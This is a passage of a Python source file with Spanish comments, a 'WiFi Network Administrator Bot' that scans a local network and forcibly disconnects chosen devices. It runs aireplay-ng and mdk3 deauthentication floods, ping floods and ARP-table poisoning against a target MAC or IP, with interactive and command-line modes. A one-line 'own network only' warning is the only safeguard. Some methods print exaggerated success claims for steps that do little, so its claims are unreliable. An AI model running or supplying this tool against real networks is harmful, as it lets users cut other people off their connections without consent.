            # Este método requeriría acceso al router
            # Por ahora, mostrar información de cómo hacerlo manualmente
            gateway = self.config['network']['gateway']
            
            print(f"{Colors.CYAN}📋 Para bloqueo efectivo en el router:{Colors.END}")
            print(f"   1. Accede a {gateway} en tu navegador")
            print(f"   2. Busca 'Control de Acceso' o 'MAC Filtering'")
            print(f"   3. Bloquea la MAC: {target_mac}")
            print(f"   4. O usa 'Control Parental' para limitar el dispositivo")
            
            return False  # No implementado automáticamente
            
        except Exception:
            return False
    
    def _try_network_interference(self, target_mac: str, target_ip: str = None) -> bool:
        """Intentar interferencia de red"""
        try:
            if not target_ip:
                return False
                
            print(f"{Colors.YELLOW}🌐 Generando interferencia de red...{Colors.END}")
            
            # Método 1: Flood de paquetes ARP
            gateway = self.config['network']['gateway']
            
            for i in range(10):
                try:
                    # Enviar pings rápidos para saturar
                    subprocess.run(['ping', '-c', '5', '-i', '0.1', target_ip], 
                                 capture_output=True, timeout=2)
                    
                    # Limpiar caché ARP
                    subprocess.run(['arp', '-d', target_ip], 
                                 capture_output=True)
                    
                except subprocess.TimeoutExpired:
                    pass
            
            print(f"{Colors.GREEN}✅ Interferencia aplicada a {target_ip}{Colors.END}")
            return True
            
        except Exception:
            return False
    
    def _try_aireplay_deauth(self, target_mac: str) -> bool:
        """Intentar usar aireplay-ng para deautenticación"""
        try:
            gateway_mac = self.get_gateway_mac()
            if not gateway_mac or not self.interface:
                return False
            
            # Comando aireplay-ng
            cmd = ['aireplay-ng', '--deauth', str(self.config['settings']['deauth_count']), 
                   '-a', gateway_mac, '-c', target_mac, self.interface]
            
            result = subprocess.run(cmd, capture_output=True, timeout=10)
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}✅ Deautenticación exitosa con aireplay-ng{Colors.END}")
                self.logger.warning(f"Dispositivo desautenticado con aireplay: {target_mac}")
                return True
                
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        return False
    
    def _try_mdk3_deauth(self, target_mac: str) -> bool:
        """Intentar usar mdk3 para deautenticación"""
        try:
            if not self.interface:
                return False
            
            # Crear archivo temporal con la MAC objetivo
            with open('/tmp/targets.txt', 'w') as f:
                f.write(target_mac + '\n')
            
            # Comando mdk3
            cmd = ['mdk3', self.interface, 'd', '-t', '/tmp/targets.txt', '-c', '1']
            
            # Ejecutar por unos segundos
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(3)
            process.terminate()
            
            print(f"{Colors.GREEN}✅ Deautenticación exitosa con mdk3{Colors.END}")
            self.logger.warning(f"Dispositivo desautenticado con mdk3: {target_mac}")
            
            # Limpiar archivo temporal
            os.remove('/tmp/targets.txt')
            return True
            
        except (FileNotFoundError, Exception):
            pass
        
        return False
    
    def _simulate_deauth(self, target_mac: str, target_ip: str = None) -> bool:
        """Desconexión efectiva usando métodos macOS nativos"""
        print(f"{Colors.BLUE}� Aplicando desconexión avanzada para macOS{Colors.END}")
        
        if target_ip:
            print(f"{Colors.YELLOW}🎯 Objetivo: {target_ip} ({target_mac}){Colors.END}")
            
            try:
                # Método 1: Saturación de conexión
                print(f"{Colors.CYAN}📡 Aplicando saturación de conexión...{Colors.END}")
                for i in range(20):
                    subprocess.run(['ping', '-c', '1', '-s', '1024', target_ip], 
                                 capture_output=True, timeout=0.5)
                
                # Método 2: Limpieza agresiva de ARP
                print(f"{Colors.CYAN}🧹 Limpiando caché ARP...{Colors.END}")
                for _ in range(5):
                    subprocess.run(['arp', '-d', target_ip], capture_output=True)
                    time.sleep(0.2)
                
                # Método 3: Interferencia de red
                print(f"{Colors.CYAN}⚡ Aplicando interferencia de red...{Colors.END}")
                
                # Crear múltiples conexiones simultáneas
                processes = []
                for i in range(10):
                    proc = subprocess.Popen(['ping', '-c', '50', '-i', '0.01', target_ip], 
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    processes.append(proc)
                
                # Esperar un momento
                time.sleep(3)
                
                # Terminar procesos
                for proc in processes:
                    proc.terminate()
                
                # Método 4: Manipulación de tabla ARP
                gateway = self.config['network']['gateway']
                print(f"{Colors.CYAN}🔄 Manipulando tabla ARP...{Colors.END}")
                
                # Intentar confundir la tabla ARP
                for _ in range(10):
                    subprocess.run(['ping', '-c', '1', gateway], capture_output=True, timeout=1)
                    subprocess.run(['arp', '-s', target_ip, 'ff:ff:ff:ff:ff:ff'], 
                                 capture_output=True)
                    time.sleep(0.1)
                    subprocess.run(['arp', '-d', target_ip], capture_output=True)
                
                # Marcar dispositivo como desconectado
                if target_mac in self.devices:
                    self.devices[target_mac]['status'] = 'targeted'
                    self.devices[target_mac]['last_seen'] = datetime.now().isoformat()
                
                print(f"{Colors.GREEN}✅ Ataque de desconexión aplicado a: {target_mac}{Colors.END}")
                print(f"{Colors.YELLOW}⚠️  El dispositivo puede experimentar inestabilidad de red{Colors.END}")
                print(f"{Colors.BLUE}ℹ️  Efecto típico: 30-120 segundos de desconexión{Colors.END}")
                
                # Log del ataque
                self.logger.warning(f"Ataque de desconexión aplicado: {target_mac} ({target_ip})")
                
                return True
                
            except Exception as e:
                print(f"{Colors.RED}❌ Error en ataque: {e}{Colors.END}")
                return False
        else:
            # Sin IP, usar método básico
            print(f"{Colors.YELLOW}⚠️  Sin IP objetivo, aplicando método básico{Colors.END}")
            
            # Marcar como objetivo
            if target_mac in self.devices:
                self.devices[target_mac]['status'] = 'targeted'
                
            print(f"{Colors.GREEN}✅ Dispositivo marcado como objetivo: {target_mac}{Colors.END}")
            self.logger.info(f"Dispositivo marcado: {target_mac}")
            return True
    
    def get_gateway_mac(self) -> Optional[str]:
        """Obtener MAC del gateway/router"""
        try:
            gateway_ip = self.config['network']['gateway']
            
            if SCAPY_AVAILABLE:
                # Importar clases específicas de Scapy
                from scapy.all import ARP, Ether, srp
                
                # Crear petición ARP para el gateway
                arp_request = ARP(pdst=gateway_ip)
                broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                arp_request_broadcast = broadcast / arp_request
                
                answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
                
                if answered_list:
                    return answered_list[0][1].hwsrc
            else:
                # Método alternativo usando ARP del sistema
                return self.get_mac_from_ip(gateway_ip)
                
            return None
                
        except Exception as e:
            self.logger.error(f"Error obteniendo MAC del gateway: {e}")
            return None
    
    def continuous_monitoring(self):
        """Monitoreo continuo de la red"""
        print(f"{Colors.GREEN}🔄 Iniciando monitoreo continuo...{Colors.END}")
        self.monitoring = True
        
        while self.monitoring:
            try:
                self.scan_network_devices()
                time.sleep(self.config['settings']['scan_interval'])
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Deteniendo monitoreo...{Colors.END}")
                self.monitoring = False
                break
            except Exception as e:
                self.logger.error(f"Error en monitoreo: {e}")
                time.sleep(5)
    
    def interactive_menu(self):
        """Menú interactivo del bot"""
        while True:
            try:
                print(f"\n{Colors.CYAN}{'='*50}")
                print(f"{'WIFI NETWORK ADMINISTRATOR':^50}")
                print(f"{'='*50}{Colors.END}")
                print(f"{Colors.WHITE}1.{Colors.END} Escanear red")
                print(f"{Colors.WHITE}2.{Colors.END} Mostrar dispositivos")
                print(f"{Colors.WHITE}3.{Colors.END} Desconectar dispositivo")
                print(f"{Colors.WHITE}4.{Colors.END} Monitoreo continuo")
                print(f"{Colors.WHITE}5.{Colors.END} Configurar interfaz")
                print(f"{Colors.WHITE}6.{Colors.END} Configuración")
                print(f"{Colors.WHITE}7.{Colors.END} Ver logs")
                print(f"{Colors.WHITE}0.{Colors.END} Salir")
                print("-" * 50)
                
                choice = input(f"{Colors.YELLOW}Selecciona una opción: {Colors.END}").strip()
                
                if choice == '1':
                    devices = self.scan_network_devices()
                    print(f"{Colors.GREEN}✅ Escaneo completado. {len(devices)} dispositivos encontrados{Colors.END}")
                    
                elif choice == '2':
                    self.display_devices()
                    
                elif choice == '3':
                    self.disconnect_device_menu()
                    
                elif choice == '4':
                    if self.interface:
                        monitor_thread = threading.Thread(target=self.continuous_monitoring)
                        monitor_thread.daemon = True
                        monitor_thread.start()
                        input(f"{Colors.YELLOW}Presiona Enter para detener el monitoreo...{Colors.END}")
                        self.monitoring = False
                    else:
                        print(f"{Colors.RED}❌ Primero configura una interfaz en modo monitor{Colors.END}")
                        
                elif choice == '5':
                    self.configure_interface_menu()
                    
                elif choice == '6':
                    self.configuration_menu()
                    
                elif choice == '7':
                    self.show_logs()
                    
                elif choice == '0':
                    print(f"{Colors.GREEN}¡Hasta luego! 👋{Colors.END}")
                    break
                    
                else:
                    print(f"{Colors.RED}❌ Opción inválida{Colors.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.GREEN}¡Hasta luego! 👋{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.END}")
    
    def disconnect_device_menu(self):
        """Menú para desconectar dispositivos"""
        if not self.devices:
            print(f"{Colors.YELLOW}No hay dispositivos detectados. Ejecuta un escaneo primero.{Colors.END}")
            return
        
        self.display_devices()
        print(f"\n{Colors.YELLOW}Selecciona el dispositivo a desconectar:{Colors.END}")
        
        try:
            device_num = int(input("Número de dispositivo (0 para cancelar): "))
            if device_num == 0:
                return
            
            if 1 <= device_num <= len(self.devices):
                mac = list(self.devices.keys())[device_num - 1]
                device = self.devices[mac]
                
                print(f"\nDispositivo seleccionado:")
                print(f"IP: {device['ip']}")
                print(f"MAC: {device['mac']}")
                print(f"Hostname: {device['hostname']}")
                
                confirm = input(f"{Colors.RED}¿Confirmas desconectar este dispositivo? (s/N): {Colors.END}").lower()
                if confirm == 's':
                    self.deauth_device(device['mac'], device['ip'])
                else:
                    print("Operación cancelada")
            else:
                print(f"{Colors.RED}❌ Número de dispositivo inválido{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}❌ Por favor ingresa un número válido{Colors.END}")
    
    def configure_interface_menu(self):
        """Menú para configurar interfaz de red"""
        interfaces = self.get_network_interfaces()
        
        print(f"\n{Colors.CYAN}Interfaces de red disponibles:{Colors.END}")
        for i, iface in enumerate(interfaces, 1):
            print(f"{i}. {iface}")
        
        try:
            choice = int(input("Selecciona interfaz (0 para cancelar): "))
            if choice == 0:
                return
            
            if 1 <= choice <= len(interfaces):
                interface = interfaces[choice - 1]
                
                confirm = input(f"¿Configurar {interface} en modo monitor? (s/N): ").lower()
                if confirm == 's':
                    if self.setup_monitor_mode(interface):
                        self.interface = interface
                        self.config['network']['interface'] = interface
                        self.save_config()
                        print(f"{Colors.GREEN}✅ Interfaz configurada: {interface}{Colors.END}")
                    else:
                        print(f"{Colors.RED}❌ Error configurando interfaz{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Selección inválida{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}❌ Por favor ingresa un número válido{Colors.END}")
    
    def configuration_menu(self):
        """Menú de configuración"""
        print(f"\n{Colors.CYAN}{'='*40}")
        print(f"{'CONFIGURACIÓN':^40}")
        print(f"{'='*40}{Colors.END}")
        print(f"{Colors.WHITE}1.{Colors.END} Ver configuración actual")
        print(f"{Colors.WHITE}2.{Colors.END} Modificar red objetivo")
        print(f"{Colors.WHITE}3.{Colors.END} Gestionar whitelist")
        print(f"{Colors.WHITE}4.{Colors.END} Configurar notificaciones")
        print(f"{Colors.WHITE}0.{Colors.END} Volver")
        
        choice = input(f"{Colors.YELLOW}Selecciona una opción: {Colors.END}").strip()
        
        if choice == '1':
            print(json.dumps(self.config, indent=2))
        elif choice == '2':
            self.configure_network()
        elif choice == '3':
            self.manage_whitelist()
        elif choice == '4':
            self.configure_notifications()
    
    def manage_whitelist(self):
        """Gestionar dispositivos protegidos"""
        print(f"\n{Colors.CYAN}Dispositivos protegidos:{Colors.END}")
        whitelist = self.config['security']['whitelist']
        
        if whitelist:
            for i, mac in enumerate(whitelist, 1):
                print(f"{i}. {mac}")
        else:
            print("No hay dispositivos en la whitelist")
        
        print(f"\n{Colors.WHITE}1.{Colors.END} Agregar dispositivo")
        print(f"{Colors.WHITE}2.{Colors.END} Remover dispositivo")
        print(f"{Colors.WHITE}0.{Colors.END} Volver")
        
        choice = input("Opción: ").strip()
        
        if choice == '1':
            mac = input("Ingresa MAC address (formato xx:xx:xx:xx:xx:xx): ").strip()
            if self.validate_mac(mac):
                self.config['security']['whitelist'].append(mac.upper())
                self.save_config()
                print(f"{Colors.GREEN}✅ Dispositivo agregado a whitelist{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Formato de MAC inválido{Colors.END}")
        
        elif choice == '2' and whitelist:
            try:
                index = int(input("Número de dispositivo a remover: ")) - 1
                if 0 <= index < len(whitelist):
                    removed = whitelist.pop(index)
                    self.save_config()
                    print(f"{Colors.GREEN}✅ {removed} removido de whitelist{Colors.END}")
                else:
                    print(f"{Colors.RED}❌ Índice inválido{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}❌ Por favor ingresa un número válido{Colors.END}")
    
    def validate_mac(self, mac: str) -> bool:
        """Validar formato de MAC address"""
        pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
        return bool(re.match(pattern, mac))
    
    def show_logs(self):
        """Mostrar logs recientes"""
        try:
            with open('wifi_admin.log', 'r') as f:
                lines = f.readlines()
                print(f"\n{Colors.CYAN}Últimos 20 logs:{Colors.END}")
                print("-" * 80)
                for line in lines[-20:]:
                    print(line.strip())
        except FileNotFoundError:
            print(f"{Colors.YELLOW}No hay archivo de log disponible{Colors.END}")
    
    def run(self):
        """Ejecutar el bot principal"""
        if not self.check_permissions():
            return
        
        print(f"{Colors.GREEN}🚀 WiFi Network Administrator Bot iniciado{Colors.END}")
        print(f"{Colors.YELLOW}⚠️  ADVERTENCIA: Úsalo solo en tu propia red{Colors.END}")
        print(f"{Colors.BLUE}ℹ️  Configuración cargada desde: {self.config_file}{Colors.END}")
        
        # Auto-configurar interfaz si está disponible
        if self.config['network']['interface']:
            if self.setup_monitor_mode(self.config['network']['interface']):
                self.interface = self.config['network']['interface']
        
        # Escaneo inicial si está habilitado
        if self.config['settings']['auto_scan']:
            print(f"{Colors.BLUE}Realizando escaneo inicial...{Colors.END}")
            self.scan_network_devices()
        
        # Iniciar menú interactivo
        self.interactive_menu()

def main():
    """Función principal"""
    parser = argparse.ArgumentParser(description='WiFi Network Administrator Bot')
    parser.add_argument('--config', '-c', default='wifi_config.json', 
                       help='Archivo de configuración (default: wifi_config.json)')
    parser.add_argument('--interface', '-i', help='Interfaz de red a usar')
    parser.add_argument('--scan', action='store_true', help='Solo escanear y salir')
    parser.add_argument('--target', '-t', help='MAC address del dispositivo objetivo')
    parser.add_argument('--disconnect', action='store_true', help='Desconectar dispositivo objetivo')
    
    args = parser.parse_args()
    
    # Crear instancia del bot
    bot = WiFiNetworkBot(args.config)
    
    # Configurar interfaz si se especifica
    if args.interface:
        if bot.setup_monitor_mode(args.interface):
            bot.interface = args.interface
    
    # Modo solo escaneo
    if args.scan:
        if bot.check_permissions():
            devices = bot.scan_network_devices()
            bot.display_devices()
        return
    
    # Modo desconexión directa
    if args.disconnect and args.target:
        if bot.check_permissions():
            if bot.interface:
                bot.deauth_device(args.target)
            else:
                print(f"{Colors.RED}❌ Especifica una interfaz con --interface{Colors.END}")
        return
    
    # Modo interactivo
    bot.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}👋 ¡Programa terminado por el usuario!{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}❌ Error fatal: {e}{Colors.END}")
        sys.exit(1)